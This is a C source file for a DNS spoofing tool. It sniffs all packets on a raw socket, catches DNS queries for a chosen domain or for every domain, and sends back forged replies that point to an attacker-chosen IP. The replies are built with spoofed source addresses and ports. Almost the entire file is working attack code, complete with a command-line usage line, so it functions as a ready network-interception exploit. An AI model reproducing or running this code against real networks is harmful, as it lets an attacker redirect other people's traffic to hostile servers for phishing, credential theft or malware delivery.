#include "dns.h"

/**
* Prints a terminal message with host IP and request
*/
void print_message(char* request, char* ip){
	fprintf(stdout,"Host %s made a request to %s\n", ip, request);
}

/**
* Calculates a checksum for a given header
*/

unsigned short check_sum(unsigned short *buf, int nwords){
	unsigned long sum;
	for (sum = 0; nwords > 0; nwords--)
	sum += *buf++;
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return ~sum;
}

void extract_ip_from_iphdr(u_int32_t raw_ip, char* ip){
	int i;
	int aux[4];
	for(i=0;i<4;i++){
	aux[i] = (raw_ip >> (i*8)) & 0xff;
	}
	sprintf(ip, "%d.%d.%d.%d", aux[0], aux[1], aux[2], aux[3]);
}

/**
* Builds a DNS answer
*/

unsigned int build_dns_answer(char *SPOOF_IP, struct dns_HEADER *dns_hdr, char* answer, char* request){
	unsigned int size = 0; /* answer size */
	struct DNS_query *dns_query;
	unsigned char ans[4];
	sscanf(SPOOF_IP, "%d.%d.%d.%d",(int *)&ans[0],(int *)&ans[1], (int *)&ans[2], (int *)&ans[3]);
	dns_query = (struct DNS_query*)(((char*) dns_hdr) + sizeof(struct dns_HEADER));
	//dns_hdr
	memcpy(&answer[0], dns_hdr->ID, 2); //id
	memcpy(&answer[2], "\x81\x80", 2); //flags
	memcpy(&answer[4], "\x00\x01", 2); //qd_count
	memcpy(&answer[6], "\x00\x01", 2); //an_count
	memcpy(&answer[8], "\x00\x00", 2); //ns_count
	memcpy(&answer[10], "\x00\x00", 2); //ar_count
	//dns_query
	size = strlen(request)+2;// +1 for the size of the first string; +1 for the last ‘.’
	memcpy(&answer[12], dns_query, size); //query_name
	size+=12;
	memcpy(&answer[size], "\x00\x01", 2); //type
	size+=2;
	memcpy(&answer[size], "\x00\x01", 2); //class
	size+=2;
	//dns_answer
	memcpy(&answer[size], "\xc0\x0c", 2); //pointer to query_name
	size+=2;
	memcpy(&answer[size], "\x00\x01", 2); //type
	size+=2;
	memcpy(&answer[size], "\x00\x01", 2); //class
	size+=2;
	memcpy(&answer[size], "\x00\x00\x00\x22", 4); //ttl – 34s
	size+=4;
	memcpy(&answer[size], "\x00\x04", 2); //rdata length
	size+=2;
	memcpy(&answer[size], ans, 4); //rdata
	size+=4;
	return size;
}

void build_udp_ip_datagram(char* datagram, unsigned int payload_size, char* src_ip, char* dst_ip, u_int16_t port){
	struct ip *ip_hdr = (struct ip *) datagram;
	struct udphdr *udp_hdr = (struct udphdr *) (datagram + sizeof (struct ip));
	ip_hdr->ip_hl = 5; //header length
	ip_hdr->ip_v = 4; //version
	ip_hdr->ip_tos = 0; //tos
	ip_hdr->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + payload_size; //length
	ip_hdr->ip_id = 0; //id
	ip_hdr->ip_off = 0; //fragment offset
	ip_hdr->ip_ttl = 255; //ttl
	ip_hdr->ip_p = 17; //protocol
	ip_hdr->ip_sum = 0; //temp checksum
	ip_hdr->ip_src.s_addr = inet_addr (dst_ip); //src ip – spoofed
	ip_hdr->ip_dst.s_addr = inet_addr(src_ip); //dst ip
	udp_hdr->source = htons(53); //src port – spoofed
	udp_hdr->dest = htons(port); //dst port
	udp_hdr->len = htons(sizeof(struct udphdr) + payload_size); //length
	udp_hdr->check = 0; //checksum – disabled
	ip_hdr->ip_sum = check_sum((unsigned short *) datagram, ip_hdr->ip_len >> 1); //real checksum
}

void extract_dns_request(struct DNS_query *dns_query, char *request){
	unsigned int i, j, k;
	char *curr = dns_query->query_name;
	unsigned int size;
	size = curr[0];
	j = 0;
	i = 1;

	while(size > 0){
		for(k = 0; k < size; k++){
			request[j++] = curr[i+k];
		}

		request[j++] = '.';
		i += size;
		size = curr[i++];
	}

	request[--j] = '\0';
}

/**
* Extracts the src port from a udp header
*/

void extract_port_from_udphdr(struct udphdr* udp, u_int16_t* port){
	(*port) = ntohs((*(u_int16_t*)udp));
}

void extract_dns_data(const unsigned char *packet, struct dns_HEADER **dns_hdr, struct DNS_query *dns_query, char* src_ip, char* dst_ip, u_int16_t *port){

	struct etherHEADER *ether;
	struct iphdr *ip;
	struct udphdr *udp;
	unsigned int ip_header_size;
	/* ethernet header */
	ether = (struct etherHEADER*)(packet);
	/* ip header */
	ip = (struct iphdr*)(((char*) ether) + sizeof(struct etherHEADER));

	extract_ip_from_iphdr(ip->saddr, src_ip);
	extract_ip_from_iphdr(ip->daddr, dst_ip);

	ip_header_size = ip->ihl*4;
	udp = (struct udphdr *)(((char*) ip) + ip_header_size);
	extract_port_from_udphdr(udp, port);

	/* dns header */
	*dns_hdr = (struct dns_HEADER*)(((char*) udp) + sizeof(struct udphdr));
	dns_query->query_name = ((char*) *dns_hdr) + sizeof(struct dns_HEADER);
}

void send_dns_answer(char* ip, u_int16_t port, char* packet, int packlen){
	struct sockaddr_in to_addr;
	int bytes_sent;
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	int one = 1;
	const int *val = &one;
	if (sock < 0) {
	fprintf(stderr, "Error creating socket");
	return;
	}
	to_addr.sin_family = AF_INET;
	to_addr.sin_port = htons(port);
	to_addr.sin_addr.s_addr = inet_addr(ip);
	if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0){
	fprintf(stderr, "Error at setsockopt()");
	return;
	}
	bytes_sent = sendto(sock, packet, packlen, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
	if(bytes_sent < 0)
	fprintf(stderr, "Error sending data");
}


void DNS_packet_handler(const unsigned char *packet){

	int all_flag=0;

	struct DNS_query dns_query;
	struct dns_HEADER *dns_hdr;

	char request[REQUEST_SIZE];
	char src_ip[IP_SIZE], dst_ip[IP_SIZE];

	u_int16_t port;

	char datagram[DATAGRAM_SIZE];
	char* answer;

	unsigned int datagram_size;
	memset(datagram, 0, DATAGRAM_SIZE);

	extract_dns_data(packet, &dns_hdr, &dns_query, src_ip, dst_ip, &port);
	extract_dns_request(&dns_query, request);

	if(!strcmp(ORIGINAL_SITE, "all")){
		all_flag = 1;
	}
	else{
		all_flag = 0;
	}

	if(all_flag){
		/* if it is the request that we are looking for */
		/* answer is pointed to the beginning of dns header */
		answer = datagram + sizeof(struct ip) + sizeof(struct udphdr);
		/* modifies answer to attend our dns spoof and returns its size */
		datagram_size = build_dns_answer(SPOOF_IP, dns_hdr, answer, request);
		/* modifies udp/ip to attend our dns spoof */
		build_udp_ip_datagram(datagram, datagram_size, src_ip, dst_ip, port);
		/* update the datagram size with ip and udp header */
		datagram_size += (sizeof(struct ip) + sizeof(struct udphdr));
		/* sends our dns spoof msg */
		send_dns_answer(src_ip, port, datagram, datagram_size);
		print_message(request, src_ip);
	}
	else{
		if(!strcmp(ORIGINAL_SITE,request)){
			/* if it is the request that we are looking for */
			/* answer is pointed to the beginning of dns header */
			answer = datagram + sizeof(struct ip) + sizeof(struct udphdr);
			/* modifies answer to attend our dns spoof and returns its size */
			datagram_size = build_dns_answer(SPOOF_IP, dns_hdr, answer, request);
			/* modifies udp/ip to attend our dns spoof */
			build_udp_ip_datagram(datagram, datagram_size, src_ip, dst_ip, port);
			/* update the datagram size with ip and udp header */
			datagram_size += (sizeof(struct ip) + sizeof(struct udphdr));
			/* sends our dns spoof msg */
			send_dns_answer(src_ip, port, datagram, datagram_size);
			print_message(request, src_ip);
		}
	}
}

void verify_DNS_packet(unsigned char *Buffer , int Size){
	unsigned short iphdrlen;
	struct iphdr *iph = (struct iphdr *)(Buffer + sizeof(struct ethhdr));

	iphdrlen = iph->ihl*4;		//size of the IP packet

	struct udphdr *udph = (struct udphdr*)(Buffer + iphdrlen + sizeof(struct ethhdr));
	if(ntohs(udph->dest) == 53){			//check if its DNS request , by default its port 53
		DNS_packet_handler(Buffer);
	}
}

void process_packet(unsigned char* buffer, int size){
	//Get the IP Header part of this packet , excluding the ethernet header
	struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
	switch (iph->protocol){
		case 17:
			verify_DNS_packet(buffer , size);
			break;
		default:
			break;
	}
}

int main(int argc,char **argv){

	if(argc < 3){
		fprintf(stderr, "Usage: executable [originalSite/all] [redirectedSite]\n");
		return -1;
	}
	else{
		strncpy(ORIGINAL_SITE,argv[1],20);
		strncpy(SPOOF_IP,argv[2],20);
	}

	int saddr_size , data_size;
	struct sockaddr saddr;
	unsigned char *buffer = (unsigned char *) malloc(65536);

	int sock_raw = socket( AF_PACKET , SOCK_RAW , htons(ETH_P_ALL)) ;

	if(sock_raw < 0){
		perror("Socket Error");
		return 1;
	}

	while(1){
		saddr_size = sizeof(saddr);
		data_size = recvfrom(sock_raw , buffer , 65536 , 0 , &saddr , (socklen_t*)&saddr_size);
		if(data_size < 0){
			fprintf(stderr,"Recvfrom error , failed to get packets\n");
			return 1;
		}
		//Now process the packet
		process_packet(buffer, data_size);
	}
	close(sock_raw);
	return 0;
}